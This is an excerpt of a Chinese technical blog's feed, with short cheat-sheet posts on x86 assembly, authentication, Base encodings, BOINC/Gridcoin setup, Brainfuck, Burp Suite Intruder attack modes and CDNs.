<li>指令指针寄存器：RIP</li>
<li>标志寄存器：RFLAGS</li>
</ul>
<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>常见的汇编指令如下：</p>
<ul>
<li><code>mov</code>：传送指令，两个操作对象的位数应该一致，如 <code>mov eax,ebx</code>，表示将 EBX 的值送入 EAX 中。8086 CPU 不支持将数据直接送入段寄存器的操作，要想实现此功能，只能用一个寄存器来进行中转。</li>
<li><code>add</code>：加法指令，两个操作对象的位数应该一致，如 <code>add eax,ebx</code>，表示将 EAX 和 EBX 相加，其值赋给 EAX。</li>
<li><code>sub</code>：减法指令，如 <code>sub eax,ebx</code>，表示用 EAX 减 EBX，其值赋给 EAX。</li>
<li><code>push</code>：</li>
<li><code>pop</code>：</li>
<li><code>jmp</code>：跳转指令，属于转移指令，如 <code>jmp 2AE3:3</code>，表示将 CS 设为 <code>2AE3H</code>，将 IP 设为 <code>0003H</code>，CPU 将从 CS:IP（即 <code>2AE33H</code>）处读取指令；<code>jmp eax</code> 表示将 EAX 的值赋给 IP，CS 保持不变。</li>
<li><code>jnz</code>：条件跳转指令，检查 EFLAGS 标志寄存器中的 ZF 位（零标志位）是否为 0，若不为 0，则跳转。</li>
<li><code>jz</code>：条件跳转指令，检查 EFLAGS 标志寄存器中的 ZF 位（零标志位）是否为 0，若为 0，则跳转。</li>
<li><code>in</code>：从 I/O 端口读取内容，如 <code>in al,21H</code>，表示从 21H 端口读取内容到 AL 中。</li>
<li><code>out</code>：向 I/O 端口写入内容，如 <code>out 21H,al</code>，表示将 AL 的值写入到 21H 端口中。</li>
<li><code>xor</code>：按位异或运算，即相同为 0，不同为 1，如 <code>xor eax,ebx</code>，表示将 EAX 和 EBX 按位异或，其值赋给 EAX。对同一个值进行异或，会使其得 0，汇编中常用这种方法得到 0，如 <code>xor eax,eax</code>。</li>
<li><code>or</code>：按位或运算，如 <code>or eax,ebx</code>，表示将 EAX 和 EBX 按位或，其值赋给 EAX。</li>
</ul>
<p>注意：汇编指令和寄存器名称不区分大小写。</p>
<h2 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h2><p>伪指令依赖于具体的汇编器，这里我们以 GNU 中的 as 汇编器（gas）为例，讲述常见的伪指令及其含义：</p>
<ul>
<li><code>.set</code>：为变量设置一个值，如 <code>.set CR0_PE_ON, 0x1</code>。</li>
<li><code>.globl</code> 或 <code>.global</code>：设置外部链接，使其在其他文件中可被调用，如 <code>.globl start</code>。</li>
<li><code>.code16</code>：生成 16 位汇编代码。</li>
<li><code>.code32</code>：生成 32 位汇编代码。</li>
<li><code>.p2align</code>：</li>
<li><code>.word</code>：</li>
<li><code>.long</code>：</li>
</ul>
<p>想要了解更多的伪指令可以参考 <a href="https://sourceware.org/binutils/docs/as/Pseudo-Ops.html#Pseudo-Ops">gas 的官方文档</a>。</p>
<h2 id="标号"><a href="#标号" class="headerlink" title="标号"></a>标号</h2><p>标号代表一个地址，类似于高级语言中的函数，在需要时可以使用跳转指令跳转到标号处执行，利用标号还可以实现死循环，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spin:</span><br><span class="line">    jmp spin</span><br></pre></td></tr></table></figure>

<h2 id="风格"><a href="#风格" class="headerlink" title="风格"></a>风格</h2><p>x86 汇编语言的两大风格分别是 <strong>Intel 风格</strong>和 <strong>AT&amp;T 风格</strong>，分别被 Microsoft 和 GNU 所采用，两种风格的详细区别如下表所示：</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>Intel 风格</th>
<th>AT&amp;T 风格</th>
</tr>
</thead>
<tbody><tr>
<td>操作数顺序</td>
<td>目标操作数在前，如 <code>mov eax,8</code></td>
<td>源操作数在前，如 <code>movl $8,%eax</code></td>
</tr>
<tr>
<td>寄存器名字</td>
<td>原样，如 <code>mov eax,8</code></td>
<td>加 <code>%</code> 前缀，如 <code>movl $8,%eax</code></td>
</tr>
<tr>
<td>立即数</td>
<td>原样，如 <code>mov eax,8</code></td>
<td>加 <code>$</code> 前缀，如 <code>movl $8,%eax</code></td>
</tr>
<tr>
<td>16进制立即数</td>
<td>用后缀 <code>b</code> 与 <code>h</code> 分别表示二进制与十六进制，对于 16 进制字母开头的要加前缀 <code>0</code></td>
<td>加前缀 <code>0x</code></td>
</tr>
<tr>
<td>访问内存长度的表示</td>
<td>前缀 <code>byte ptr</code>，<code>word ptr</code>，<code>dword ptr</code></td>
<td>后缀 <code>b</code>、<code>w</code>、<code>l</code>表示字节、字、长型</td>
</tr>
<tr>
<td>引用全局或静态变量 var 的值</td>
<td>[_var]</td>
<td>_var</td>
</tr>
<tr>
<td>引用全局或静态变量 var 的地址</td>
<td>_var</td>
<td>$_var</td>
</tr>
<tr>
<td>寄存器间址</td>
<td>[reg]</td>
<td>(%reg)</td>
</tr>
<tr>
<td>寄存器变址寻址</td>
<td>[reg + _x]</td>
<td>_x(%reg)</td>
</tr>
<tr>
<td>立即数变址寻址</td>
<td>[reg + 1]</td>
<td>1(%reg)</td>
</tr>
<tr>
<td>整数数组寻址</td>
<td>[eax*4 + array]</td>
<td>_array (,%eax, 4)</td>
</tr>
<tr>
<td>注释</td>
<td>:注释以英文分号开头</td>
<td>#注释以井号开头</td>
</tr>
</tbody></table>
<p>本文的书写风格以 Intel 风格为主。</p>
<h2 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h2><p>内联汇编（Inline Assembly）是指在 C 代码中嵌入汇编代码，显然，其语法是由具体的 C 编译器所决定的，这里主要以 GNU 中的 gcc 编译器为例简述其语法。</p>
<h2 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h2><p>要了解汇编语言更多的知识，可以阅读王爽的<a href="https://book.douban.com/subject/25726019/">《汇编语言》</a>一书，这本书基于 16 位的 8086 CPU 来讲解汇编，虽然处理器已过时，但思想永不褪色。</p>
<p>其次，<a href="https://www.ibm.com/developerworks/cn/linux/l-assembly/index.html">Linux 汇编语言开发指南</a>，也是一篇不错的介绍文章。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>身份认证的几种方式</title>
    <url>/2018/11/16/authentication/</url>
    <content><![CDATA[<p>身份认证的目的是确认当前所声称为某种身份的用户，确实是所声称的用户。简单来说，就是为了确认<strong>你是你</strong>。</p>
<p>身份认证大致可分为三种：基于生物学特征的身份认证、基于共享密钥的身份认证以及基于公钥加密算法的身份认证，以下分别说明：</p>
<span id="more"></span>
<h2 id="基于生物学特征的身份认证"><a href="#基于生物学特征的身份认证" class="headerlink" title="基于生物学特征的身份认证"></a>基于生物学特征的身份认证</h2><p>基于生物学特征的身份认证是指基于每个人身体上独一无二的特征，如指纹、虹膜等等。</p>
<p>这种认证方式极具便利性，但同时安全性也最低，此外，生物学特征信息一旦泄露，无法更改。</p>
<h2 id="基于共享密钥的身份认证"><a href="#基于共享密钥的身份认证" class="headerlink" title="基于共享密钥的身份认证"></a>基于共享密钥的身份认证</h2><p>基于共享密钥的身份认证是指服务器端和用户共同拥有一个或一组密码。用户通过输入或通过保管有密码的设备提交由用户和服务器共同拥有的密码，服务器检查用户所提交的密码是否与服务器端保存的密码一致，如果一致，就判断用户为合法用户，否则判定身份验证失败。</p>
<p>这种认证方式是目前互联网上所广泛应用的。</p>
<h2 id="基于公钥加密算法的身份认证"><a href="#基于公钥加密算法的身份认证" class="headerlink" title="基于公钥加密算法的身份认证"></a>基于公钥加密算法的身份认证</h2><p>基于公钥加密算法的身份认证是指通信中的双方分别持有公钥和私钥，由其中的一方采用私钥对特定数据进行加密，而对方采用公钥对数据进行解密，如果解密成功，就认为用户是合法用户，否则就认为是身份验证失败。</p>
<p>很难说明，<strong>基于共享密钥的身份认证</strong>和<strong>基于公钥加密算法的身份认证</strong>哪个更为安全，<strong>基于共享密钥的身份认证</strong>的不安全处主要在于共享密钥的传播过程中，而<strong>基于公钥加密算法的身份认证</strong>的不安全处则主要在于私钥的存储过程中。</p>
<hr>
<p>为了提升身份认证的安全性，有时会结合使用以上三种认证方式，这便是<strong>多因素认证</strong>（Multi-factor authentication），如果只使用了以上三种认证方式中的两种，则又称为<strong>双因素认证</strong>（Two-factor authentication），简称 <strong>2FA</strong>。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>强大的autojump</title>
    <url>/2018/09/19/autojump/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Base 编码家族</title>
    <url>/2018/08/10/base/</url>
    <content><![CDATA[<h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><p>Base64，顾名思义是一种基于 <strong>64</strong> 个可打印字符来表示二进制数据的表示方法，这 64 个字符分别为 <code>A-Z</code>、<code>a-z</code>、<code>0-9</code> 以及 <code>+</code> 与 <code>/</code>。64 个字符可用 6 个比特位表示，3 个字节有 24 个比特位，对应于 4 个 Base64 单元，所以编码后的数据要比原始数据略长，为原来的 4/3。Base64 索引表如下所示：</p>
<table>
<thead>
<tr>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>A</td>
<td>16</td>
<td>Q</td>
<td>32</td>
<td>g</td>
<td>48</td>
<td>w</td>
</tr>
<tr>
<td>1</td>
<td>B</td>
<td>17</td>
<td>R</td>
<td>33</td>
<td>h</td>
<td>49</td>
<td>x</td>
</tr>
<tr>
<td>2</td>
<td>C</td>
<td>18</td>
<td>S</td>
<td>34</td>
<td>i</td>
<td>50</td>
<td>y</td>
</tr>
<tr>
<td>3</td>
<td>D</td>
<td>19</td>
<td>T</td>
<td>35</td>
<td>j</td>
<td>51</td>
<td>z</td>
</tr>
<tr>
<td>4</td>
<td>E</td>
<td>20</td>
<td>U</td>
<td>36</td>
<td>k</td>
<td>52</td>
<td>0</td>
</tr>
<tr>
<td>5</td>
<td>F</td>
<td>21</td>
<td>V</td>
<td>37</td>
<td>l</td>
<td>53</td>
<td>1</td>
</tr>
<tr>
<td>6</td>
<td>G</td>
<td>22</td>
<td>W</td>
<td>38</td>
<td>m</td>
<td>54</td>
<td>2</td>
</tr>
<tr>
<td>7</td>
<td>H</td>
<td>23</td>
<td>X</td>
<td>39</td>
<td>n</td>
<td>55</td>
<td>3</td>
</tr>
<tr>
<td>8</td>
<td>I</td>
<td>24</td>
<td>Y</td>
<td>40</td>
<td>o</td>
<td>56</td>
<td>4</td>
</tr>
<tr>
<td>9</td>
<td>J</td>
<td>25</td>
<td>Z</td>
<td>41</td>
<td>p</td>
<td>57</td>
<td>5</td>
</tr>
<tr>
<td>10</td>
<td>K</td>
<td>26</td>
<td>a</td>
<td>42</td>
<td>q</td>
<td>58</td>
<td>6</td>
</tr>
<tr>
<td>11</td>
<td>L</td>
<td>27</td>
<td>b</td>
<td>43</td>
<td>r</td>
<td>59</td>
<td>7</td>
</tr>
<tr>
<td>12</td>
<td>M</td>
<td>28</td>
<td>c</td>
<td>44</td>
<td>s</td>
<td>60</td>
<td>8</td>
</tr>
<tr>
<td>13</td>
<td>N</td>
<td>29</td>
<td>d</td>
<td>45</td>
<td>t</td>
<td>61</td>
<td>9</td>
</tr>
<tr>
<td>14</td>
<td>O</td>
<td>30</td>
<td>e</td>
<td>46</td>
<td>u</td>
<td>62</td>
<td>+</td>
</tr>
<tr>
<td>15</td>
<td>P</td>
<td>31</td>
<td>f</td>
<td>47</td>
<td>v</td>
<td>63</td>
<td>/</td>
</tr>
</tbody></table>
<span id="more"></span>
<p>编码 <code>Hello</code> 的过程如下：</p>
<table>
<thead>
<tr>
<th>文本</th>
<th>H</th>
<th>e</th>
<th>l</th>
<th>l</th>
<th>o</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>ASCII 编码</td>
<td>72</td>
<td>101</td>
<td>108</td>
<td>108</td>
<td>111</td>
<td></td>
</tr>
<tr>
<td>二进制位</td>
<td>‭01001000‬</td>
<td>‭01100101‬</td>
<td>‭01101100‬</td>
<td>‭01101100‬</td>
<td>‭01101111‬</td>
<td>00000000</td>
</tr>
</tbody></table>
<p>以6个二进制位进行编码：</p>
<table>
<thead>
<tr>
<th>二进制位</th>
<th>010010</th>
<th>000110</th>
<th>010101</th>
<th>101100</th>
<th>011011</th>
<th>000110</th>
<th>111100</th>
<th>000000</th>
</tr>
</thead>
<tbody><tr>
<td>索引</td>
<td>18</td>
<td>6</td>
<td>21</td>
<td>44</td>
<td>27</td>
<td>6</td>
<td>60</td>
<td></td>
</tr>
<tr>
<td>Base64 编码</td>
<td>S</td>
<td>G</td>
<td>V</td>
<td>s</td>
<td>b</td>
<td>G</td>
<td>8</td>
<td>=</td>
</tr>
</tbody></table>
<p>若原数据不是 3 的倍数，且多出 1 个字节，则在编码末尾加 2 个 <code>=</code>，多出 2 个字节，则在编码末尾加 1 个 <code>=</code>。换言之，若多出 1 个字节，则最后一个 6 位的 Base64 字节块有 4 位是 0 值，若多出 2 个字节，则最后一个 6 位的 Base64 字节块有 2 位是 0 值。</p>
<h2 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h2><p>与上类似，Base32 基于 32 个可打印字符，分别为 <code>A-Z</code> 以及 <code>2-7</code>。32 个字符可用 5 个比特位表示，5 个字节有 40 个比特位，对应于 8 个 Base32 单元，编码后的数据比原始数据略长 8/5。若原数据不是 5 的倍数，且多出 1 个字节，则在编码末尾加 4 个 <code>=</code>，多出 2 个字节，则在编码末尾加 3 个 <code>=</code>，多出 3 个字节，则在编码末尾加 2 个 <code>=</code>，多出 4 个字节，则在编码末尾加 1 个 <code>=</code>。Base32 索引表如下所示：</p>
<table>
<thead>
<tr>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>A</td>
<td>8</td>
<td>I</td>
<td>16</td>
<td>Q</td>
<td>24</td>
<td>Y</td>
</tr>
<tr>
<td>1</td>
<td>B</td>
<td>9</td>
<td>J</td>
<td>17</td>
<td>R</td>
<td>25</td>
<td>Z</td>
</tr>
<tr>
<td>2</td>
<td>C</td>
<td>10</td>
<td>K</td>
<td>18</td>
<td>S</td>
<td>26</td>
<td>2</td>
</tr>
<tr>
<td>3</td>
<td>D</td>
<td>11</td>
<td>L</td>
<td>19</td>
<td>T</td>
<td>27</td>
<td>3</td>
</tr>
<tr>
<td>4</td>
<td>E</td>
<td>12</td>
<td>M</td>
<td>20</td>
<td>U</td>
<td>28</td>
<td>4</td>
</tr>
<tr>
<td>5</td>
<td>F</td>
<td>13</td>
<td>N</td>
<td>21</td>
<td>V</td>
<td>29</td>
<td>5</td>
</tr>
<tr>
<td>6</td>
<td>G</td>
<td>14</td>
<td>O</td>
<td>22</td>
<td>W</td>
<td>30</td>
<td>6</td>
</tr>
<tr>
<td>7</td>
<td>H</td>
<td>15</td>
<td>P</td>
<td>23</td>
<td>X</td>
<td>31</td>
<td>7</td>
</tr>
</tbody></table>
<h2 id="Base16"><a href="#Base16" class="headerlink" title="Base16"></a>Base16</h2><p>与上类似，Base16 基于 16 个可打印字符，分别为 <code>0-9</code> 以及 <code>A-F</code>。16 个字符可用 4 个比特位表示，1 个字节有 8 个比特位，对应于 2 个 Base16 单元，编码后的数据比原始数据略长 2。显然，在 Base16 中不需要在末尾填充 <code>=</code>。Base16 索引表如下所示：</p>
<table>
<thead>
<tr>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
<th>数值</th>
<th>字符</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0</td>
<td>4</td>
<td>4</td>
<td>8</td>
<td>8</td>
<td>12</td>
<td>C</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>5</td>
<td>5</td>
<td>9</td>
<td>9</td>
<td>13</td>
<td>D</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>6</td>
<td>6</td>
<td>10</td>
<td>A</td>
<td>14</td>
<td>E</td>
</tr>
<tr>
<td>3</td>
<td>3</td>
<td>7</td>
<td>7</td>
<td>11</td>
<td>B</td>
<td>15</td>
<td>F</td>
</tr>
</tbody></table>
<h2 id="Base64URL"><a href="#Base64URL" class="headerlink" title="Base64URL"></a>Base64URL</h2><p>Base64URL 编码是在 Base64 编码的结果的基础上做的一些修改，主要是为了方便编码后的字符串在网络中传输。其做的修改如下：</p>
<ol>
<li>去除尾部的 <code>=</code></li>
<li>将 <code>+</code> 替换成 <code>-</code></li>
<li>将 <code>/</code> 替换成 <code>_</code></li>
</ol>
<p>类似的，解码为原 Base64 编码结果，遵循如下步骤：</p>
<ol>
<li>将 <code>-</code> 替换成 <code>+</code></li>
<li>将 <code>_</code> 替换成 <code>/</code></li>
<li>计算 <code>Base64URL 编码长度 % 4</code> 的值：<br>a. 结果为 0，不做处理<br>b. 结果为 2，字符串添加 <code>==</code><br>c. 结果为 3，字符串添加 <code>=</code></li>
</ol>
<h2 id="XXencode"><a href="#XXencode" class="headerlink" title="XXencode"></a>XXencode</h2><p>XXencode 不属于 Base 编码家族，但与 Base64 编码极为类似，区别仅在于 64 个可打印字符及其顺序，XXencode 使用的为 <code>+</code>、<code>-</code>、<code>0-9</code>、<code>A-Z</code>、<code>a-z</code>。</p>
<h2 id="UUencode"><a href="#UUencode" class="headerlink" title="UUencode"></a>UUencode</h2><p>UUencode 也与 Base64 极为类似，它使用的字符及其顺序为 <code>(space)</code>、<code>!</code>、<code>&quot;</code>、<code>#</code>、<code>$</code>、<code>%</code>、<code>&amp;</code>、<code>&#39;</code>、<code>(</code>、<code>)</code>、<code>*</code>、<code>+</code>、<code>,</code>、<code>-</code>、<code>.</code>、<code>/</code>、<code>0-9</code>、<code>:</code>、<code>;</code>、<code>&lt;</code>、<code>=</code>、<code>&gt;</code>、<code>?</code>、<code>@</code>、<code>A-Z</code>、<code>[</code>、<code>\</code>、<code>]</code>、<code>^</code>、<code>_</code>、`。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>巴科斯范式</title>
    <url>/2018/09/12/bnf/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>使用 BOINC 来挖掘格雷德币</title>
    <url>/2018/12/16/boinc-gridcoin/</url>
    <content><![CDATA[<h2 id="BOINC"><a href="#BOINC" class="headerlink" title="BOINC"></a>BOINC</h2><p><a href="https://boinc.berkeley.edu/">BOINC</a>，全称 Berkeley Open Infrastructure for Network Computing，即伯克利开放式网络计算平台，是由加州大学伯克利分校发展出的分布式计算平台。BOINC 会利用志愿者电脑的空闲资源来对各个项目下发的任务进行运算，目前 BOINC 平台上有如下知名项目：</p>
<ul>
<li><a href="https://setiathome.berkeley.edu/">SETI@home</a>：由加州大学伯克利分校主办，主要目的为搜索外太空文明。</li>
<li><a href="https://einsteinathome.org/zh-cn/home">Einstein@Home</a>：由威斯康星大学密尔沃基分校主办，主要目的为搜索脉冲星的引力波。</li>
<li><a href="http://www.gpugrid.net/index.php">GPUGrid.net</a>：主要目的为做分子生物动力学相关的研究。</li>
<li><a href="https://www.worldcommunitygrid.org/discover.action">IBM World Community Grid</a>：中文翻译为“世界公共网格”，由 IBM 主办，主要目的为利用分布式计算来帮助查找人类疾病的治疗方法，和改善人类生活的相关研究。随着项目的不断扩大，World Community Grid 逐渐发展成为一个医药、生物和环境等各种方面研究类的更高层次分布式计算平台。目前正在该平台上运行的知名子项目包括：<ul>
<li><a href="https://www.worldcommunitygrid.org/research/faah/overview.do?language=zh_CN">FightAIDS@Home</a>：主要目的为研究 HIV 的治疗方法。</li>
</ul>
</li>
</ul>
<span id="more"></span>

<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>在 Ubuntu 中，执行如下命令即可安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install boinc-client boinc-manager</span><br></pre></td></tr></table></figure>

<p>如果你想使用 BOINC 来挖掘格雷德币，请不要在首次启动后按照提示添加项目，具体的操作可参考下面的步骤。</p>
<h2 id="Gridcoin"><a href="#Gridcoin" class="headerlink" title="Gridcoin"></a>Gridcoin</h2><p><a href="https://gridcoin.us/">Gridcoin</a>，简称 GRC，中文翻译为“格雷德币”，一种开源的数字货币，其主要用于奖励在 BOINC 平台上参与计算的志愿者。</p>
<p>值得注意的是，并非所有的 BOINC 项目都会奖励格雷德币，只有参与特定的项目才会获得格雷德币，具体的项目列表可参考 Gridcoin 官方的<a href="https://gridcoin.us/Guides/whitelist.htm">项目白名单</a>，这份白名单里也列出了哪些项目会使用到 GPU 进行运算。</p>
<h3 id="矿池"><a href="#矿池" class="headerlink" title="矿池"></a>矿池</h3><p>Gridcoin 官网中提到了 2 个矿池：<a href="https://www.grcpool.com/">grcpool</a> 和 <a href="https://grc.arikado.ru/">Arikado Pool</a>，建议使用 grcpool，以下是为 BOINC 配置 grcpool 矿池的具体过程：</p>
<ol>
<li>前往 grcpool 注册一个账号。</li>
<li>切换到 BOINC 的高级视图：依次点击 <code>View</code> ——&gt; <code>Advanced View</code>。</li>
<li>配置 grcpool 矿池：依次点击 <code>Tools</code> ——&gt; <code>Use Account Manager</code>，打开对话框，选择 <code>grcpool</code>，输入之前注册的账号和密码，并确定。</li>
<li>转到 grcpool 的个人信息页面，点击 <code>Hosts</code> 下的 <code>My Hosts</code>，你将会看到刚刚添加的计算机名，点击进去，选择 <code>choose project</code>，挑选自己感兴趣的项目，点击 <code>add</code>，最后点击页面左上方的 <code>save project settings</code> 进行保存。</li>
<li>在 BOINC 中进行同步：依次点击 <code>Tools</code> ——&gt; <code>Synchronize with grcpool.com</code>，并按照提示完成。</li>
</ol>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Brainfuck</title>
    <url>/2018/08/09/brainfuck/</url>
    <content><![CDATA[<p>Brainfuck 是在 1993 年创建的一种极小化的计算机语言，由于 fuck 在英语中是脏话，这种语言有时也被称为 Brainf*ck 或 Brainf***，或被简称为 BF。</p>
<p>Brainfuck 中共有 8 种字符，它们及其含义如下所示：</p>
<ul>
<li><code>&gt;</code>：指针加一</li>
<li><code>&lt;</code>：指针减一</li>
<li><code>+</code>：指针指向的字节的值加一</li>
<li><code>-</code>：指针指向的字节的值减一</li>
<li><code>.</code>：输出指针指向的单元内容（ASCII 码）</li>
<li><code>,</code>：输入内容到指针指向的单元（ASCII 码）</li>
<li><code>[</code>：如果指针指向的单元值为零，向后跳转到对应的 <code>]</code> 指令的次一指令处</li>
<li><code>]</code>：如果指针指向的单元值不为零，向前跳转到对应的 <code>[</code> 指令的次一指令处</li>
</ul>
<p>下面是一个用 Brainfuck 在屏幕上打印 <code>Hello World</code> 的程序例子：</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line">++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span>&gt;<span class="literal">+</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;++<span class="string">.</span>&gt;<span class="literal">+</span><span class="string">.</span>++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span><span class="string">.</span>++<span class="literal">+</span><span class="string">.</span>&gt;++<span class="string">.</span>&lt;&lt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span></span><br><span class="line">&gt;<span class="string">.</span>++<span class="literal">+</span><span class="string">.</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&gt;<span class="literal">+</span><span class="string">.</span>&gt;<span class="string">.</span></span><br></pre></td></tr></table></figure>

<p>程序的运行结果如 <a href="https://fatiherikli.github.io/brainfuck-visualizer/">Brainfuck Visualizer</a> 所示。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Sniper、Battering ram、Pitchfork、Cluster bomb 的区别</title>
    <url>/2018/05/01/burpsuite-intruder-attack-type/</url>
    <content><![CDATA[<p>Burp Suite 中的 Intruder 模块里有 4 种攻击模式，分别为 Sniper、Battering ram、Pitchfork、Cluster bomb，在这里假设 Payload set1=[1, 2]，Payload set2=[a, b, c, d]：</p>
<h2 id="Sniper"><a href="#Sniper" class="headerlink" title="Sniper"></a>Sniper</h2><p>Sniper，中文“狙击手”，每次只针对 1 个 Payload Position，使用 1 个 Payload set，示例如下：</p>
<table>
<thead>
<tr>
<th>Request</th>
<th>Position1(default:x)</th>
<th>Position2(default:y)</th>
</tr>
</thead>
<tbody><tr>
<td>#1</td>
<td>1</td>
<td>y</td>
</tr>
<tr>
<td>#2</td>
<td>2</td>
<td>y</td>
</tr>
<tr>
<td>#3</td>
<td>x</td>
<td>1</td>
</tr>
<tr>
<td>#4</td>
<td>x</td>
<td>2</td>
</tr>
</tbody></table>
<h2 id="Battering-ram"><a href="#Battering-ram" class="headerlink" title="Battering ram"></a>Battering ram</h2><p>Battering ram，中文“攻城槌”，每次针对多个 Payload Position，使用 1 个 Payload set，示例如下：</p>
<table>
<thead>
<tr>
<th>Request</th>
<th>Position1</th>
<th>Position2</th>
</tr>
</thead>
<tbody><tr>
<td>#1</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>#2</td>
<td>2</td>
<td>2</td>
</tr>
</tbody></table>
<h2 id="Pitchfork"><a href="#Pitchfork" class="headerlink" title="Pitchfork"></a>Pitchfork</h2><p>Pitchfork，中文“杈子”，每次针对多个 Payload Position，使用多个 Payload set，最多支持 5 个列表，也即 5 个位置，采用平行模式，请求次数以最小列表项为准，示例如下：</p>
<table>
<thead>
<tr>
<th>Request</th>
<th>Position1</th>
<th>Position2</th>
</tr>
</thead>
<tbody><tr>
<td>#1</td>
<td>1</td>
<td>a</td>
</tr>
<tr>
<td>#2</td>
<td>2</td>
<td>b</td>
</tr>
</tbody></table>
<h2 id="Cluster-bomb"><a href="#Cluster-bomb" class="headerlink" title="Cluster bomb"></a>Cluster bomb</h2><p>Cluster bomb，中文“集束炸弹”，每次针对多个 Payload Position，使用多个 Payload set，最多支持 5 个列表，也即 5 个位置，采用交叉模式，请求次数为各列表项之积，示例如下：</p>
<table>
<thead>
<tr>
<th>Request</th>
<th>Position1</th>
<th>Position2</th>
</tr>
</thead>
<tbody><tr>
<td>#1</td>
<td>1</td>
<td>a</td>
</tr>
<tr>
<td>#2</td>
<td>1</td>
<td>b</td>
</tr>
<tr>
<td>#3</td>
<td>1</td>
<td>c</td>
</tr>
<tr>
<td>#4</td>
<td>1</td>
<td>d</td>
</tr>
<tr>
<td>#5</td>
<td>2</td>
<td>a</td>
</tr>
<tr>
<td>#6</td>
<td>2</td>
<td>b</td>
</tr>
<tr>
<td>#7</td>
<td>2</td>
<td>c</td>
</tr>
<tr>
<td>#8</td>
<td>2</td>
<td>d</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>CDN</title>
    <url>/2021/01/21/cdn/</url>
    <content><![CDATA[<p><strong>CDN</strong> 全称 Content Distribution Network，即<strong>内容分发网络</strong>。CDN 管理分布在多个地理位置上的服务器，在它的服务器中存储各种类型的 Web 内容（包括文档、图片、音频和视频等）的副本，并且所有试图将每个用户请求定向到一个将提供最好的用户体验的 CDN 位置。</p>
<p>CDN 可以是<strong>专用 CDN</strong>（private CDN），即它由内容提供商自己所拥有；例如，谷歌的 CDN 分发 YouTube 视频和其他类型的内容。也可以是<strong>第三方 CDN</strong>（third-party CDN），它代表多个内容提供商分发内容；<a href="https://www.akamai.com/cn/zh/">Akamai</a>、<a href="https://www.limelight.com/">Limelight</a> 和 <a href="https://www.cloudflare.com/zh-cn/cdn">Cloudflare CDN</a> 都运行第三方 CDN。</p>
<span id="more"></span>

<p>相比于使用 CDN，建立单一的大规模数据中心存在以下三个问题：</p>
<ul>
<li>如果客户远离数据中心，服务器到客户的分组将跨越许多通信链路并很可能通过许多 ISP，其中某些 ISP 可能位于不同的大洲。如果这些链路之一提供的吞吐量小于内容消耗速率，端到端吞吐量也将小于该消耗速率，给用户带来恼人的停滞时延。出现这种事件的可能性随着端到端的路径中链路数量的增加而增加。</li>
<li>流行的内容很可能经过相同的通信链路发送许多次。这不仅浪费了网络带宽，内容提供商自己也将为向因特网反复发送 <em>相同</em> 的字节而向其 ISP 运营商（连接到数据中心）支付费用。</li>
<li>单个数据中心代表一个单点故障，如果数据中心或其通向因特网的链路崩溃，它将不能够分发 <em>任何</em> 内容了。</li>
</ul>
